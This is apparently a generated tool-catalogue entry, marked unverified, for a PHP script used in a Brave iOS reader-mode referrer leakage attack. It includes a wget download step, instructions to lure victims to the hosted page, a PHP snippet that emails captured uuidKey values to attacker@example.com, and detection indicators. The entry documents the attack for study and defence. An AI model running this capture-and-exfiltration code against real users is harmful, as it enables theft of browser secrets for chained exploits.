---
id: tool-reader-uuid-leakage-php
url: >-
  https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8xv283s0ch6zqo6nwdwxaupqbrsq?...
  (attachment)
tags:
  - logging
  - capture
  - php
type: tool
verified: false
platforms:
  - Web
  - Server
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:14.687Z'
validated: true
submitted: true
---
# reader_uuid_leakage.php

**Status**: Unverified

## Overview

A simple PHP server-side script designed to host a malicious page and capture leaked UUID keys from HTTP REFERER headers during Brave iOS reader mode exploitation.

## Description

This tool is a custom PHP script used in the Brave iOS referrer leakage attack. It serves an HTML page with hyperlinks that trigger the vulnerability and logs incoming requests, specifically parsing the REFERER header for the uuidKey from internal reader mode URLs. It's essential for the information disclosure phase, allowing attackers to collect sensitive keys for chaining exploits.

## Features

- Serves malicious HTML with hyperlinks for reader mode interaction.
- Captures and logs HTTP REFERER headers.
- Parses and extracts uuidKey from leaked internal URLs.
- Basic logging to file or console for key retrieval.

## Installation

### Requirements

- PHP 7.0+ with HTTPS server (e.g., Apache/Nginx).
- Access to S3 or file storage for attachment if sourced from HackerOne.

### Install Commands

```bash
# Download and place in web root
wget 'https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8xv283s0ch6zqo6nwdwxaupqbrsq?...' -O reader_uuid_leakage.php
chmod 644 reader_uuid_leakage.php
```

## Basic Usage

```bash
# Serve via PHP built-in server for testing
php -S localhost:8000 reader_uuid_leakage.php
```

### Common Options

| Option | Description |
|--------|-------------|
| None (script-based) | Runs as HTTP endpoint; configure logging in code |

## Examples

### Example 1: Basic Usage

Host the script on an HTTPS server and direct victims to `https://yourserver.com/reader_uuid_leakage.php`. When the leaky navigation occurs, check server logs for REFERER entries.

### Example 2: Advanced Usage

Modify the script to email captured keys:

```php
// In reader_uuid_leakage.php, add after logging:
if (preg_match('/uuidKey=([a-f0-9-]+)/', $_SERVER['HTTP_REFERER'], $matches)) {
    mail('attacker@example.com', 'Leaked Key', $matches[1]);
}
```
Serve and monitor.

## Expected Output

Server access logs or custom log file showing lines like:

`[IP] GET /target HTTP/1.1 REFERER: internal://reader?url=...&uuidKey=123e4567-e89b-12d3-a456-426614174000`

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Web Protocols]] Application Layer Protocol: Web Protocols
- [[Archive Collected Data]] Archive Collected Data

### Tactics

- [[Exfiltration]] Exfiltration
- [[Collection]] Collection

## Detection

Indicators and methods for detecting this tool's usage:

- Unusual PHP endpoints serving static HTML with hyperlinks.
- Server logs showing frequent REFERER headers with 'internal://reader' patterns from mobile UAs.
- Network traffic to obscure domains with Brave iOS user agents.

## Related Procedures


## Related Tools

- [[Burp Suite]] (for proxying and modifying requests)

## References

- HackerOne Report #1438028
- Brave iOS GitHub Repository
